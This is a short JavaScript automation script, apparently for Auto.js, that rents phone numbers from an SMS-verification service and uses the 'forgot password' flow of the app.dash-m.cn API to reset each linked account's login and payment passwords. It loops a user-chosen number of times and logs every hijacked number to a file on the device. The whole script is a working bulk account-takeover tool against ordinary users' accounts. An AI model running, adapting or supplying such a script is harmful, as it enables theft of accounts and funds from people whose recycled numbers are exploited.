
name = ("短租账号")
pass = ("短租密码")
cs = rawInput("请输入次数")
for (var i=0;i<cs;i++) 
{ 
var get = http.get("http://api.jmyzm.com/http.do?action=loginIn&uid="+name+"&pwd="+pass)
var DZ = get.body.string();
//////////
var arr = DZ.split("|"); 
var dz = arr.slice(1,3)
//////登录
var get1 = http.get("http://api.jmyzm.com/http.do?action=getMobilenum&pid=44541&uid="+name+"&token="+dz+"&mobile=&size=1&vno=0")
var DZ1 = get1.body.string();
var sjh = DZ1.substring(0,11)



var url = "http://app.dash-m.cn/api/auth/sendMsg";
var res = http.post(url, {
    "mobile": sjh,
    "type": "forget"
    
    
});
var html = res.body.json();
console.show()
log(sjh)
log(html.msg)
var fh = html.msg
if(fh=="验证码发送成功")
{
    toast("验证码发送成功，20秒后获取")   
    sleep(20000)
var yzm = http.get("http://api.jmyzm.com/http.do?action=getVcodeAndReleaseMobile&uid="+name+"&token="+dz+"&mobile="+sjh+"&author_uid=pan5678")
var tp = yzm.body.string();
var sb = tp.substring(29,35);
var nb = tp.substring(0,11)
if (sjh==nb)
{
var url1 = "http://app.dash-m.cn/api/auth/forgetPwd";
var res1 = http.post(url1, {
    
    "mobile": nb,
    "code": sb,
    "pwd" : "",
    "newPwd":"修改登录密码",
    "type" : "login_pwd"  
});
var html1 = res1.body.json();
log(html1.msg)
if (html1.msg=="密码修改成功！")
{
   sleep(2000)
  
var url2 = "app.dash-m.cn/api/auth/forgetPwd";
var res2 = http.post(url2, {
    "mobile": sjh,
    "code": sb,
    "pwd" :"",
    "newPwd": "修改支付密码",
    "type": "trade_pwd"
    
    
});
var html2 = res2.body.json();
log("交易密码"+html2.msg)
toast("修改成功")
    sleep(2000)
  var lu = open("/sdcard/dash.txt", "a")
  lu.writeline(sjh);
  lu.close();
  //修改交易密码
  }
}
else
{
    toast("没有验证码")

    }
    }
    else
    {
        
        }
        sleep(1000)
 http.get("http://api.jmyzm.com/http.do?action=addIgnoreList&uid="+name+"&token="+dz+"&mobiles="+sjh+"&pid=44541")
}
